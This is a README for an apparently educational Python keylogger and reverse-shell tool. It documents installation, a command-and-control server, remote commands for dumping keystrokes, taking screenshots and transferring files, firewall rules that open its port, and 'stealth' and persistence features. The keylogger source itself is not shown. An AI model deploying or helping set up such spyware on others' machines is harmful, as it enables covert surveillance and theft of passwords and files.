# KeyLogger - Educational Penetration Testing Tool

[![Python Version](https://img.shields.io/badge/python-3.8%2B-blue.svg)](https://python.org)
[![Platform](https://img.shields.io/badge/platform-Windows%20%7C%20Linux%20%7C%20macOS-lightgrey.svg)](https://github.com/anujbolewar/KeyLogger)

A cross-platform educational keylogger with reverse shell capabilities, designed for penetration testing, cybersecurity research, and educational purposes. This tool demonstrates various techniques used in ethical hacking scenarios and provides hands-on learning opportunities for cybersecurity students and professionals.

** This project is strictly for educational and research purposes only. Unauthorized use is illegal and unethical.**

---

##  **IMPORTANT DISCLAIMER**

** READ THIS BEFORE PROCEEDING **

This keylogger is designed **exclusively** for:
- **Educational purposes** and cybersecurity training
- **Authorized penetration testing** with explicit written permission
- **Research** in controlled laboratory environments
- **Personal testing** on your own devices only

### Legal Warning
- **Unauthorized deployment** of this tool is **illegal** in most jurisdictions
- Using this software without explicit consent violates privacy laws and can result in severe legal consequences
- The author(s) are **not responsible** for any misuse or illegal activities
- **Always obtain written permission** before testing on systems you don't own
- Ensure compliance with local, state, and federal laws

### Ethical Guidelines
- Only use on systems you own or have explicit authorization to test
- Respect privacy and confidentiality
- Follow responsible disclosure practices
- Use knowledge gained for defensive and educational purposes

---

##  Features

- **Cross-Platform Support**: Works seamlessly on Windows, Linux, and macOS
- **⌨ Advanced Keylogging**: Captures keystrokes with intelligent filtering
- ** Reverse Shell**: Full remote command execution capabilities
- ** Screenshot Capture**: Take remote screenshots for visual monitoring
- ** File Management**: Upload and download files bidirectionally
- ** URL Downloads**: Direct file downloads from web URLs
- ** Stealth Operation**: Minimal system footprint
- ** Configurable**: Environment-based configuration system
- ** Multi-threaded**: Non-blocking operation with threading support
- ** Real-time Monitoring**: Live keystroke dumping and analysis

---

##  Installation

### Prerequisites

- **Python 3.8+** installed on your system
- **pip** package manager
- **Administrative privileges** (for certain features)

### Quick Setup

1. **Clone the repository**:
   ```bash
   git clone https://github.com/anujbolewar/KeyLogger.git
   cd KeyLogger
   ```

2. **Install dependencies**:
   ```bash
   pip install -r requirements.txt
   ```

3. **Configure environment variables**:
   ```bash
   cp .env.example .env
   # Edit .env with your preferred settings
   ```

### Platform-Specific Setup

#### Windows
```bash
# Run as Administrator for full functionality
pip install pynput mss requests python-dotenv
```

#### Linux/Ubuntu
```bash
sudo apt update
sudo apt install python3-pip python3-dev
pip3 install -r requirements.txt
```

#### macOS
```bash
# Grant accessibility permissions in System Preferences
pip3 install -r requirements.txt
```

---

## 🚀 Usage Examples

### Basic Keylogger Operation

```python
#!/usr/bin/env python3
import keylogger

# Start keylogger (educational testing only)
keylogger.start()
```

### Server Setup (Listener)

```bash
# Terminal 1: Start the server
python3 server.py

# Output:
# [+] Listening For Incoming Connections on 127.0.0.1:54321...
# [+] Target Connected From: ('192.168.1.100', 45678)
```

### Client Connection (Target)

```bash
# Terminal 2: Connect client to server
python3 reverse_shell.py

# Output:
# [*] Attempting to connect to 127.0.0.1:54321
# [+] Successfully connected to 127.0.0.1:54321
```

### Available Commands

Once connected, use these commands in the server terminal:

```bash
* Shell#~192.168.1.100: help                # Show all available commands
* Shell#~192.168.1.100: keylog_start        # Begin keystroke logging
* Shell#~192.168.1.100: keylog_dump         # Display captured keystrokes
* Shell#~192.168.1.100: screenshot          # Capture screen
* Shell#~192.168.1.100: download file.txt   # Download file from target
* Shell#~192.168.1.100: upload file.txt     # Upload file to target
* Shell#~192.168.1.100: check               # Check admin privileges
* Shell#~192.168.1.100: q                   # Quit session
```

### Configuration Options

Edit `.env` file for custom settings:

```env
# Server Configuration
SERVER_HOST=0.0.0.0          # Bind to all interfaces
SERVER_PORT=54321            # Custom port

# Connection Settings  
MAX_CONNECTIONS=5            # Maximum concurrent connections

# File Settings
SCREENSHOT_PREFIX=screenshot # Screenshot filename prefix
```

---

## 🎯 **Live Demonstration**

Here's the KeyLogger in action, showing real captured data and successful server-client connections:

### Keystroke Capture Output
![Keylogger Output](screnshot/1.png)
*The keylogger successfully captures keystrokes including special keys like Ctrl, Alt, Backspace, and Enter. The output shows real-time logging with proper formatting.*

### Server-Client Connection
![Server Connection](screnshot/2.png)
*Demonstration of the reverse shell connection between server and client, showing successful connection establishment and command execution capabilities.*

> **Note**: These screenshots demonstrate the tool working in a controlled testing environment for educational purposes only.

---

##  Project Structure

```
KeyLogger/
├── keylogger.py          # Core keylogging functionality
├── server.py             # Command & control server
├── reverse_shell.py      # Client connection handler
├── test_client.py        # Testing utilities
├── requirements.txt      # Python dependencies
├── .env.example         # Configuration template
├── README.md            # Documentation
├── __pycache__/         # Python cache files
└── screnshot/           # Screenshot storage
    ├── 1.png
    └── 2.png
```

### Component Overview

| File | Purpose |
|------|---------|
| `keylogger.py` | Cross-platform keystroke capture and logging |
| `server.py` | Command and control interface for remote management |
| `reverse_shell.py` | Client-side connection and command execution |
| `test_client.py` | Development testing and validation tools |

---

##  Contributing

We welcome contributions from the cybersecurity and educational community! Here's how you can help:

### How to Contribute

1. **Fork the repository**
2. **Create a feature branch**: `git checkout -b feature/amazing-feature`
3. **Make your changes** with proper documentation
4. **Test thoroughly** in a controlled environment
5. **Commit your changes**: `git commit -m 'Add amazing feature'`
6. **Push to branch**: `git push origin feature/amazing-feature`
7. **Open a Pull Request** with detailed description

### Contribution Guidelines

- **Educational Focus**: Ensure all contributions maintain educational value
- **Code Quality**: Follow PEP 8 style guidelines
- **Documentation**: Include clear docstrings and comments
- **Testing**: Test on multiple platforms when possible
- **Ethical Standards**: All contributions must emphasize ethical usage

### Code Style

```python
# Example of preferred code style
def process_keystrokes(key_input):
    """
    Process captured keystrokes with proper error handling.
    
    Args:
        key_input: Raw keyboard input from pynput
        
    Returns:
        str: Formatted keystroke string
    """
    try:
        return str(key_input.char)
    except AttributeError:
        return handle_special_keys(key_input)
```

### Issue Reporting

When reporting issues, please include:
- **Operating System** and version
- **Python version**
- **Error messages** (full traceback)
- **Steps to reproduce**
- **Expected vs actual behavior**

### Contact for Collaboration

- **GitHub Issues**: For bug reports and feature requests
- **Email**: For security-related concerns or private discussions
- **Discussions**: Use GitHub Discussions for questions and ideas

---

## 🛠️ Troubleshooting

### Common Issues

#### Permission Errors
```bash
# Linux/macOS: Grant accessibility permissions
sudo python3 keylogger.py

# Windows: Run as Administrator
Right-click → "Run as administrator"
```

#### Connection Issues
```bash
# Check firewall settings
sudo ufw allow 54321/tcp  # Linux
netsh advfirewall firewall add rule name="KeyLogger" dir=in action=allow protocol=TCP localport=54321  # Windows
```

#### Module Import Errors
```bash
# Reinstall dependencies
pip3 install --upgrade -r requirements.txt

# Virtual environment (recommended)
python3 -m venv venv
source venv/bin/activate  # Linux/macOS
venv\Scripts\activate     # Windows
pip install -r requirements.txt
```

### Platform-Specific Notes

#### Windows
- Requires administrative privileges for some features
- Windows Defender may flag as potentially unwanted program
- Grant accessibility permissions in Windows Security

#### Linux
- May require X11 forwarding for GUI features
- Some distributions need additional packages: `sudo apt install python3-tk`

#### macOS
- Grant accessibility permissions in System Preferences → Security & Privacy
- May require disabling System Integrity Protection for advanced features

---

##  Frequently Asked Questions

**Q: Is this tool safe to use for learning?**  
A: Yes, when used responsibly in controlled environments on systems you own or have explicit permission to test.

**Q: Will antivirus software detect this?**  
A: Possibly. Most security software flags keyloggers. This is expected behavior and confirms the tool's realistic simulation of malware techniques.

**Q: Can I use this for bug bounty programs?**  
A: Only if explicitly permitted by the program's scope and rules. Always review terms of engagement carefully.

**Q: How do I ensure I'm using this ethically?**  
A: Follow the principle of explicit consent, document your testing, and ensure all activities are within legal boundaries.

**Q: What should I do if I find a security vulnerability?**  
A: Report it responsibly through the GitHub Issues or contact the maintainer directly for sensitive issues.

---

##  License & Legal

### License

**No formal license has been applied to this project yet.** The code is provided for educational purposes only. Please contact the author before using this code in any commercial or production environment.

> **Note**: Consider adding a proper open source license (like MIT, GPL, or Apache 2.0) to clarify usage rights and responsibilities.

### Copyright

Copyright © 2025 Anuj Bolewar. All rights reserved.

### Terms of Use

By using this software, you agree to:
- Use it only for educational, research, or authorized testing purposes
- Comply with all applicable laws and regulations
- Respect privacy and confidentiality
- Not use it for malicious, illegal, or unethical activities
- Take full responsibility for your actions

### Liability Disclaimer

The authors and contributors:
- Provide this software "as is" without warranty
- Are not liable for any damages or legal issues arising from use
- Do not endorse or encourage illegal activities
- Recommend consulting legal counsel before use in professional environments

---

##  Author Information

**Anuj Bolewar**
- **GitHub**: [@anujbolewar](https://github.com/anujbolewar)
- **Project Repository**: [KeyLogger](https://github.com/anujbolewar/KeyLogger)

### Professional Background
Cybersecurity enthusiast and developer focused on educational security tools and ethical hacking methodologies. Passionate about helping others learn cybersecurity through hands-on, practical examples.

---

##  Changelog

### Version 1.0.0 (Current)
- ✅ Cross-platform keylogger implementation
- ✅ Reverse shell functionality
- ✅ Screenshot capabilities
- ✅ File transfer features
- ✅ Environment-based configuration
- ✅ Comprehensive documentation

### Planned Features
- 🔮 Encrypted communication channels
- 🔮 Advanced persistence mechanisms
- 🔮 Network traffic analysis
- 🔮 Mobile platform support
- 🔮 Web-based management interface

---

## 🙏 Acknowledgments

- **pynput** developers for cross-platform input monitoring
- **mss** team for efficient screenshot capabilities  
- **Python community** for excellent documentation and support
- **Cybersecurity educators** who emphasize ethical hacking practices
- **Open source contributors** who make learning accessible

### Educational Resources

For those interested in learning more about cybersecurity:
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [NIST Cybersecurity Framework](https://www.nist.gov/cyberframework)
- [Ethical Hacking Courses](https://www.coursera.org/browse/information-technology/security)

---

## 📞 Support

If you find this project helpful for your cybersecurity education, please:
-  **Star this repository**
-  **Fork it** for your own experiments
-  **Share it** with fellow security enthusiasts
-  **Contribute** improvements and features

**Remember**: Knowledge is powerful. Use it responsibly. 🛡️

---

*This README was crafted with ❤️ for the cybersecurity education community. Happy (ethical) hacking!*
